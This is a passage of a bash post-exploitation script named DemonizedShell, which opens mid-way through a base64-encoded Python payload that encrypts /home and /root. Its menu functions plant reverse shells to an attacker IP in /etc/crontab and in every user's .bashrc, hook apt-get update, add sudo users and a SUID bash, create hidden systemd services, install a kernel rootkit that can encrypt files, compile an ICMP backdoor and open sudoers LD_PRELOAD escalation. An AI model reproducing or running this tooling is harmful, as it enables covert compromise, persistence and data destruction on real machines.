0KCkKICAgICAgICAgICAgICAgICAgICB0aHJlYWRzLmFwcGVuZCh0KQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBlbmNfZGlyKG9zLnBhdGguam9pbihyb290LCBkKSkKCnBpZCA9IG9zLmZvcmsoKQppZiBwaWQgPjA6CiAgICBleGl0KDApCnQ9dGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZW5jX2RpcikKdC5zdGFydCgpCnRocmVhZHMuYXBwZW5kKHQpCnQ9dGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZW5jX2RpcixhcmdzPSgiL2hvbWUvIiwpKQp0LnN0YXJ0KCkKdGhyZWFkcy5hcHBlbmQodCkKdD10aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1lbmNfZGlyLCBhcmdzPSgiL3Jvb3QvIiwpKQp0LnN0YXJ0KCkKdGhyZWFkcy5hcHBlbmQodCkKcHJpbnQoInV3dS4uLiIpCmZvciB0IGluIHRocmVhZHM6CiAgICB0LmpvaW4oKQogICAgZGVsIHQKcHJpbnQoInV3dSEhISIpCmlmIGM6CiAgICBjLmNsb3NlKCk="
LOCUTUS_C=""

rainbow() {
    local text=$1
    echo "$text" #| lolcat -p 0.3 -a -d 1
}

requirements() {
    sudo apt-get install lolcat git make gcc -y
}

crontab() {
    rainbow " [*] Crontab Persistence [*] "
    echo -e "\n"
    rainbow "Want to insert a custom command into crontab?"
    rainbow "Enter 'yes' to enter a custom command or 'no' to run the default command."
    read resposta

    if [[ $resposta == "yes" ]]; then
      rainbow "Enter the command you want to add to the crontab: "
      read comando
    else
      rainbow "Enter the IP address: "
      read ip

      rainbow "Enter port: "
      read porta

      comando="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$porta 0>&1'"
    fi

    rainbow "Adding command to crontab..."
    echo "* * * * * root $comando" | sudo tee -a /etc/crontab > /dev/null
    rainbow "Command successfully added!"
}

bashRCPersistence() {
    rainbow " [*] .bashrc Persistence [*] "
    echo -e "\n"

      rainbow "Enter your listener's IP address: "
      read ip

      rainbow "Enter the port number of your listener: "
      read porta

      payload="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$porta 0>&1'"

      for usuario in /home/*; do
        if [ -d "$usuario" ]; then
          rainbow "Inserting the reverse shell payload in the .bashrc of $user..."
          rainbow "$payload" >> "$usuario/.bashrc"
          rainbow "Payload successfully inserted into $usuario/.bashrc"
        fi
      done
    rainbow ".bashrc persistence setup successfully!!"
}

userANDBashSUID() {
    rainbow " [*] Privileged User & SUID /bin/bash [*] "
    echo -e "\n"

    rainbow "Enter a name for the user: "
    read user

    adduser $user
    usermod -aG sudo $user
    chmod u+s /bin/bash

    rainbow "User $username created with root permissions and SUID set in /bin/bash"
}

apthooking() {
    rainbow " [ * ]  hooking the apt-get update command [ * ] "
    echo -e "\n"

    rainbow "Enter a payload or command, as soon as the user enters sudo apt-get update, this command that you enter below will be executed!"
    read command

    sudo touch /etc/apt/apt.conf.d/1aptget
    echo "APT::Update::Pre-Invoke {\"$command\";};" | sudo tee /etc/apt/apt.conf.d/1aptget > /dev/null

    rainbow "Your hook is in /etc/apt/apt.conf.d/1aptget with the command: $command"
}

systemdUser() {
    rainbow "[ * ] Systemd User level [ * ] "

    echo -e "\n"

      rainbow "Do you want to run a script? (Y/n): "
      read execute_script

    if [[ $execute_script == "Y" ]]; then
      rainbow "Enter the full path of the script: "
      read script_path
    else
      rainbow "Type the command to run in ExecStart: "
      read exec_command
    fi

    cat > ~/.config/systemd/user/hidden.service <<EOF
[Unit]
Description=My service

[Service]
ExecStart=${script_path:-$exec_command}
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
EOF

    if [[ $execute_script == "Y" && ! -x $script_path ]]; then
      rainbow "Error: The specified script does not have execute permission."
    else
      systemctl --user daemon-reload

      systemctl --user enable hidden.service
      systemctl --user start hidden.service
    fi

    rainbow "Systemd Persistence at user level setup successfully!!"
}
systemdRoot() {
    rainbow "[ * ] Systemd root level [ * ] "

    echo -e "\n"

    rainbow "Do you want to run a script? (Y/n): "
    read execute_script

    if [[ $execute_script == "Y" ]]; then
      rainbow "Enter the full path of the script: "
      read script_path
    else
      rainbow "Type the command to run in ExecStart: "
      read exec_command
    fi

    cat > /etc/systemd/system/hidden2.service <<EOF
[Unit]
Description=My service

[Service]
ExecStart=${script_path:-$exec_command}
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
EOF

    if [[ $execute_script == "Y" && ! -x $script_path ]]; then
      rainbow "Error: The specified script does not have execute permission."
    else
      systemctl daemon-reload

      systemctl enable hidden2.service
      systemctl start hidden2.service

      rainbow "Systemd Root level setup successfully!"
    fi
}

sshGen() {
    while IFS=':' read -r username password uid gid full_name home shell; do
        if [[ "$shell" =~ /bin/.* ]] && [[ "$home" =~ ^/home/[^/]+$ ]]; then
            rainbow "User $username has shell $shell"

            if [ ! -f "$home/.ssh/id_rsa.pub" ]; then
                rainbow "Generating ssh-key for user $username"

                sleep 5

                mkdir -p "$home/.ssh"

                ssh-keygen -t rsa -N "" -f "$home/.ssh/id_rsa"

                chmod 700 "$home/.ssh"
                chmod 600 "$home/.ssh/id_rsa"
                chown -R "$username:$username" "$home/.ssh"

                clear
            else
                rainbow "SSH key already exists for user $username"
            fi
        fi
    done < "/etc/passwd"

    sleep 3

    rainbow "SSH-KEY successfully generated for all valid users!!"
}

lkmRootkitmodified() {
  chmod +x implant_rootkit.sh
  ./implant_rootkit.sh
}

icmpBackdoor() {
  mkdir /tmp/tmpfolder
  echo $PINGOOR_MAIN_SRC | base64 -d > /tmp/tmpfolder/pingoor.c
  echo $PINGOOR_HEADER | base64 -d > /tmp/tmpfolder/pingoor.h
  rainbow "Enter the IP address that will receive the ping: "
  read LHOST
  rainbow "Enter the port number that will receive the connection: "
  read LPORT
  mv /tmp/tmpfolder/pingoor.h /tmp/tmpfolder/pingoor.h.bak
	sed -e "s/127.0.0.1/$LHOST/" -e "s/1234/$LPORT/" /tmp/tmpfolder/pingoor.h.bak > /tmp/tmpfolder/pingoor.h
	gcc -o pingoor /tmp/tmpfolder/pingoor.c -static 2> /dev/null
	rm -r /tmp/tmpfolder
  rainbow "Backdoor compiled. You can find it in the current directory under the binary name pingoor."
}

lkmRootkit(){
  echo "locutus rootkit by Terraminator (https://github.com/Terraminator)"
  echo "installing locutus..."
  sudo apt install build-essential linux-headers-$(uname -r) -y
  mkdir /tmp/borg_d3monized
  cd /tmp/borg_d3monized
  echo $LOCUTUS_MAKEFILE | base64 -d > /tmp/borg_d3monized/Makefile
  echo $LOCUTUS_BROG_TRANSWARP | base64 -d > /tmp/borg_d3monized/borg_transwarp.c
  echo $LOCUTUS_DEC | base64 -d > /tmp/borg_d3monized/dec.py
  echo $LOCUTUS_ENC | base64 -d > /tmp/borg_d3monized/enc.py
  echo $LOCUTUS_C | base64 -d > /tmp/borg_d3monized/locutus.c
  gcc /tmp/borg_d3monized/borg_transwarp.c -o /tmp/borg_d3monized/borg_transwarp
  make
  sudo mv /tmp/borg_d3monized/borg_transwarp /bin/ &&
  sudo mv /tmp/borg_d3monized/dec.py /bin/borg_dec &&
  sudo chmod +x /bin/borg_dec &&
  sudo mv /tmp/borg_d3monized/enc.py /bin/borg_enc &&
  sudo chmod +x /bin/borg_enc &&
  mv /tmp/borg_d3monized/locutus.ko /tmp/borg_d3monized/borg_locutus.ko &&
  cp /tmp/borg_d3monized/borg_locutus.ko /lib/modules/$(uname -r)/kernel/lib &&
  depmod -a &&
  echo "borg_locutus" >> /etc/modules &&
  sudo insmod /tmp/borg_d3monized/borg_locutus.ko &&
  dmesg -C &&
  echo -ne "locutus succesfully installed! \nget a reverse shell by running borg_locutus/trigger.sh <target ip> <attacker ip> <attacker port>\nget root by using kill -64 $$\nhide a process by using kill -63 pid\nencode all files on the target with kill -62 $RANDOM\ndecode all files on the target with kill -61 $RANDOM\nThe folder name is now borg_d3monized!\n"
}

SetupLdPreloadPrivesc(){
  echo "Defaults    env_keep += LD_PRELOAD" >> /etc/sudoers
  read -p "Enter with your user or www-data: " user
  echo "$user ALL=(ALL:ALL) NOPASSWD: /usr/bin/find" >> /etc/sudoers
  scs="[*] Success! LD_PRELOAD for Privesc has been implanted. [*]"

  for i in $(seq 1 ${#scs}); do
          echo -ne "${scs:i-1:1}"
          sleep 0.05
  done
  echo -ne "\n"
  clear
}

banner() {
    rainbow "
                                  ,
                                  /(        )\`
                                  \\ \___   / |
                                  /- _  \`-/  '
                                (/\\\/ \ \   /\\
                                / /   | \`    \\
                                O O   ) /    |
                                \`-^--'\`<     '
                    TM         (_.)  _  )   /
  |  | |\  | ~|~ \ /             \`.___/ \`    /
  |  | | \ |  |   X                \`-----' /
  \`__| |  \| _|_ / \\  <----.     __ / __   \\
      version 1.2     <----|====O)))==) \\) /====
                      <----'    \`--' \`.__,' \\
                                  |        |
                                    \\       /
                              ______( (_  / \______
                            ,'  ,-----'   |        \\
                            \`--{__________)        \\

  DemonizedShell is a Tool to gain persistence on linux systems"
    printf "\n\n"
}

menu() {
    cat << EOF 
  [01] Generate SSH keypair       [06] Bashrc Persistence      
  [02] APT Persistence            [07] Privileged user & SUID bash
  [03] Crontab Persistence        [08] LKM Rootkit Modified, Bypassing rkhunter & chkrootkit
  [04] Systemd User level         [09] ICMP Backdoor
  [05] Systemd Root Level         [10] LKM Rootkit
                                  [11] Setup privesc LD_PRELOAD

    [*] Coming soon others features [*]

EOF

    printf "[D3m0niz3d]~# "

    read MENUINPUT

    if [ "$MENUINPUT" == "1" ] || [ "$MENUINPUT" == "01" ]; then
        sshGen
    elif [ "$MENUINPUT" == "2" ] || [ "$MENUINPUT" == "02" ]; then
        apthooking
    elif [ "$MENUINPUT" == "3" ] || [ "$MENUINPUT" == "03" ]; then
        crontab
    elif [ "$MENUINPUT" == "4" ] || [ "$MENUINPUT" == "04" ]; then
        systemdUser
    elif [ "$MENUINPUT" == "5" ] || [ "$MENUINPUT" == "05" ]; then
        systemdRoot
    elif [ "$MENUINPUT" == "6" ] || [ "$MENUINPUT" == "06" ]; then
        bashRCPersistence
    elif [ "$MENUINPUT" == "7" ] || [ "$MENUINPUT" == "07" ]; then
        userANDBashSUID
    elif [ "$MENUINPUT" == "8" ] || [ "$MENUINPUT" == "08" ]; then
        lkmRootkitmodified
    elif [ "$MENUINPUT" == "9" ] || [ "$MENUINPUT" == "09" ]; then
        icmpBackdoor
    elif [ "$MENUINPUT" == "10" ] || [ "$MENUINPUT" == "10" ]; then
        lkmRootkit
    elif [ "$MENUINPUT" == "11" ] || [ "$MENUINPUT" == "11" ]; then
        SetupLdPreloadPrivesc
    else 
        echo "This option does not exist"
    fi
}

main() {
    if [[ $(id -u) -ne "0" ]]; then
        echo "[ERROR] You must run this script as root" >&2
        exit 1
    fi

    requirements
    clear
    banner
    sleep 0.5

    menu
}

main
